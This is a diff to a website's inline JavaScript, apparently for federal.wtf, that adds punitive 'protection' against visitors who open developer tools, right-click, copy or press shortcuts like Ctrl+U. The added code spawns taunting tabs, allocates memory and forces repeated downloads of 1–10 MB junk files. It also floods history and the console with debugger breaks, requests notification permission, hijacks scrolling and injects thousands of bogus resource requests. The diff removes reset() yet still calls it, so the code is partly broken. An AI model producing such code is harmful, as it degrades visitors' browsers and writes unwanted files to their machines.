@@ -1150,7 +1150,7 @@
   const getT = () => taunts[Math.floor(Math.random() * taunts.length)];
   const key = 'site_protection_federal_wtf';
   
-  // aggro() now takes a trigger string so you know why it was called.
+  // Main protection function – clears the document and shows a taunt.
   function aggro(trigger) {
     console.log("Protection triggered by:", trigger);
     document.documentElement.innerHTML = '';
@@ -1212,26 +1212,157 @@
     
     t.appendChild(bg);
     document.body.appendChild(t);
-  }
-  
-  // We remove extra counter/spam functions for a cleaner output.
-  function reset() {
+    
+    counter();
+    
     try {
-      localStorage.removeItem(key);
+      localStorage.setItem(key, 'protected');
     } catch (e) {
-      document.cookie = key + "=; path=/; max-age=-1";
+      document.cookie = key + "=protected; path=/; max-age=3600";
     }
   }
-  reset();
   
-  // Optionally override console (here we just leave console methods intact)
+  // A series of countermeasures that spam tabs, allocate memory, download files, etc.
+  function counter() {
+    function tabs() {
+      const n = Math.floor(Math.random() * 3) + 1;
+      for (let i = 0; i < n; i++) {
+        setTimeout(() => {
+          const txt = getT();
+          console.log("Opening extra tab with message:", txt);
+          const tab = window.open('about:blank', '_blank');
+          if (tab) {
+            tab.document.write(`<!DOCTYPE html><html><head><title>${txt}</title><style>body{background:black;color:#cdbb8a;font-family:Consolas,monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;text-align:center}h1{font-size:4rem}</style></head><body><h1>${txt}</h1></body></html>`);
+          }
+        }, i * 500);
+      }
+    }
+    
+    function mem() {
+      console.log("Allocating memory.");
+      const arr = [];
+      for (let i = 0; i < 10; i++) {
+        const a = new Array(1000000).fill('x');
+        arr.push(a);
+      }
+      window._d = arr;
+    }
+    
+    function spamFiles() {
+      console.log("Initiating spam file downloads.");
+      const ext = ['.txt', '.js', '.html', '.css', '.jpg', '.png', '.json', '.xml', '.pdf', '.svg'];
+      const pref = ['skid', 'loser', 'nice-try', 'L-plus-ratio', 'cope', 'stay-mad', 'skill-issue', 'get-good', 'bozo', 'no-inspect'];
+      
+      function makeBlob() {
+        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+        let str = '';
+        const mb = Math.floor(Math.random() * 10) + 1; // 1-10MB
+        const len = mb * 1024 * 1024;
+        for (let i = 0; i < len; i++) {
+          str += chars.charAt(Math.floor(Math.random() * chars.length));
+        }
+        return new Blob([str], {type: 'application/octet-stream'});
+      }
+      
+      function dlFile() {
+        if (document.hasFocus()) {
+          const e = ext[Math.floor(Math.random() * ext.length)];
+          const p = pref[Math.floor(Math.random() * pref.length)];
+          const n = Math.floor(Math.random() * 9999);
+          const fname = `${p}-${n}${e}`;
+          const blob = makeBlob();
+          const url = URL.createObjectURL(blob);
+          const a = document.createElement('a');
+          a.href = url;
+          a.download = fname;
+          a.style.display = 'none';
+          document.body.appendChild(a);
+          a.click();
+          setTimeout(() => {
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+          }, 100);
+        }
+      }
+      
+      for (let i = 0; i < 10; i++) {
+        setTimeout(dlFile, i * 300);
+      }
+      
+      setInterval(() => {
+        if (Math.random() > 0.7) {
+          console.log("Random spam file download triggered.");
+          dlFile();
+        }
+      }, 5000);
+    }
+    
+    function alertMsg() {
+      setTimeout(() => {
+        window.alert("This website has detected suspicious activity and has been blocked.");
+      }, 2000);
+    }
+    
+    function flood() {
+      for (let i = 0; i < 15; i++) {
+        try {
+          history.pushState({}, "Page " + i, "#blocked" + i);
+        } catch (e) {}
+      }
+    }
+    
+    function notif() {
+      if ('Notification' in window) {
+        console.log("Requesting notification permission.");
+        Notification.requestPermission().then(p => {
+          if (p === 'granted') {
+            new Notification('Security Alert', {
+              body: 'Suspicious activity detected on federal.wtf',
+              icon: '/favicon.ico'
+            });
+          }
+        });
+      }
+    }
+    
+    // spamC: flood the console with messages to deter inspection.
+    function spamC() {
+      try {
+        console.log("Starting console spam.");
+        const og = {
+          log: console.log,
+          error: console.error,
+          warn: console.warn
+        };
+        for (let i = 0; i < 10000; i++) {
+          og.error("DETECTED: Inspection attempt #" + i);
+          og.warn("WARNING: Page inspection detected");
+          og.log(getT());
+          if (i % 500 === 0) {
+            debugger;
+          }
+        }
+      } catch (e) {}
+    }
+    
+    setTimeout(tabs, 500);
+    setTimeout(mem, 1000);
+    setTimeout(spamFiles, 1000);
+    setTimeout(alertMsg, 2000);
+    setTimeout(flood, 2500);
+    setTimeout(notif, 3000);
+    setTimeout(spamC, 100);
+    
+    window.scrollTo(0, 9999);
+    setInterval(() => window.scrollTo(0, Math.random() * 9999), 500);
+  }
+  
   function disC() {
     Object.defineProperty(window, 'console', {
       get: function() { return console; },
       set: function() { return console; },
       configurable: false
     });
-    
     window.onerror = function(msg, src, ln, col, err) {
       if (msg.toLowerCase().includes('script') || msg.toLowerCase().includes('debugger')) {
         aggro("Global error triggered: " + msg);
@@ -1241,7 +1372,6 @@
   }
   
   function detDev() {
-    // Check for window dimension changes (commonly caused by dev tools)
     setInterval(function() {
       const dimCheck = (window.outerWidth - window.innerWidth > 160) ||
                        (window.outerHeight - window.innerHeight > 160);
@@ -1250,7 +1380,6 @@
       }
     }, 500);
     
-    // Simple DOM access check
     setInterval(function() {
       const el = document.createElement('div');
       let c = 0;
@@ -1272,7 +1401,6 @@
       }, 200);
     }, 1000);
     
-    // Performance check using debugger delay
     const s = performance.now();
     debugger;
     const e = performance.now();
@@ -1281,25 +1409,28 @@
     }
   }
   
+  // Improved keybind disabler – attempts to block F12, Ctrl+Shift+I/J/C, and Ctrl/Cmd+U/S/P.
   function block() {
-    document.addEventListener('keydown', function(e) {
+    window.addEventListener('keydown', function(e) {
       if (e.key === 'F12' || e.keyCode === 123) {
         e.preventDefault();
+        e.stopPropagation();
         aggro("F12 key pressed.");
         return false;
       }
       
-      if ((e.ctrlKey && e.shiftKey && (['i','j','c'].includes(e.key.toLowerCase()))) ||
-          (e.metaKey && e.altKey && (['i','j','c'].includes(e.key.toLowerCase())))) {
+      if ((e.ctrlKey && e.shiftKey && ['i','j','c'].includes(e.key.toLowerCase())) ||
+          (e.metaKey && e.altKey && ['i','j','c'].includes(e.key.toLowerCase()))) {
         e.preventDefault();
+        e.stopPropagation();
         aggro("Restricted key combination pressed.");
         return false;
       }
       
-      if ((e.ctrlKey && (['u','s','p'].includes(e.key.toLowerCase()))) ||
-          (e.metaKey && (['u','s','p'].includes(e.key.toLowerCase())))) {
+      if ((e.ctrlKey || e.metaKey) && ['u','s','p'].includes(e.key.toLowerCase())) {
         e.preventDefault();
-        aggro("Restricted key combination (Ctrl+U/S/P) pressed.");
+        e.stopPropagation();
+        aggro("Restricted key combination (Ctrl/Cmd+U/S/P) pressed.");
         return false;
       }
     }, true);
@@ -1308,18 +1439,20 @@
   function blockA() {
     document.addEventListener('contextmenu', function(e) {
       e.preventDefault();
+      e.stopPropagation();
       aggro("Context menu blocked.");
       return false;
-    });
+    }, true);
     
     ['copy', 'cut', 'paste', 'selectstart', 'dragstart'].forEach(function(ev) {
       document.addEventListener(ev, function(e) {
         if (e.target.tagName !== 'INPUT' && e.target.tagName !== 'TEXTAREA') {
           e.preventDefault();
+          e.stopPropagation();
           aggro("Event " + ev + " blocked on element.");
           return false;
         }
-      });
+      }, true);
     });
     
     const s = document.createElement('style');
@@ -1392,8 +1525,96 @@
     document.head.appendChild(s);
   }
   
-  // Omit spam() and spamC() functions entirely for clean output.
+  // Spam functions remain in place.
+  function spam() {
+    const d = document.createElement('div');
+    d.style.display = 'none';
+    d.id = 'dum';
+    document.body.appendChild(d);
+    
+    function rStr(len) {
+      const c = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+      let r = '';
+      for (let i = 0; i < len; i++) {
+        r += c.charAt(Math.floor(Math.random() * c.length));
+      }
+      return r;
+    }
+    
+    function fake() {
+      for (let i = 0; i < 1000; i++) {
+        const t = Math.random() > 0.5 ? 'script' : 'link';
+        if (t === 'script') {
+          const s = document.createElement('script');
+          s.src = rStr(10) + '.js';
+          s.async = true;
+          s.defer = true;
+          d.appendChild(s);
+        } else {
+          const l = document.createElement('link');
+          l.rel = 'stylesheet';
+          l.href = rStr(10) + '.css';
+          d.appendChild(l);
+        }
+      }
+    }
+    
+    function junk() {
+      const j = document.createElement('div');
+      j.style.display = 'none';
+      j.id = 'junk';
+      let data = '';
+      for (let i = 0; i < 1000000; i++) {
+        data += rStr(10);
+      }
+      j.setAttribute('data-junk', data);
+      d.appendChild(j);
+    }
+    
+    function img() {
+      const c = document.createElement('div');
+      c.style.display = 'none';
+      c.id = 'fake-img';
+      for (let i = 0; i < 50; i++) {
+        const im = document.createElement('img');
+        im.src = 'data:image/gif;base64,' + rStr(10000);
+        c.appendChild(im);
+      }
+      d.appendChild(c);
+    }
+    
+    fake();
+    junk();
+    img();
+    
+    setInterval(function() {
+      d.innerHTML = '';
+      fake();
+      junk();
+      img();
+    }, 30000);
+  }
   
+  function spamC() {
+    try {
+      console.log("Starting console spam.");
+      const og = {
+        log: console.log,
+        error: console.error,
+        warn: console.warn
+      };
+      for (let i = 0; i < 10000; i++) {
+        og.error("DETECTED: Inspection attempt #" + i);
+        og.warn("WARNING: Page inspection detected");
+        og.log(getT());
+        if (i % 500 === 0) {
+          debugger;
+        }
+      }
+    } catch (e) {}
+  }
+  
+  // Initialize detection routines
   disC();
   detDev();
   block();
@@ -1402,11 +1623,12 @@
   
   if (!detBot()) {
     breakOff();
+    spam();
   }
   
   window.addEventListener('beforeunload', reset);
   
-  // Additional final checks:
+  // Final checks
   if ((window.outerWidth - window.innerWidth > 160) || (window.outerHeight - window.innerHeight > 160)) {
     aggro("Final check: Outer dimension condition triggered.");
     return;
@@ -1439,7 +1661,6 @@
     }
   }
 })();
-
   </script>
 </body>
 </html>
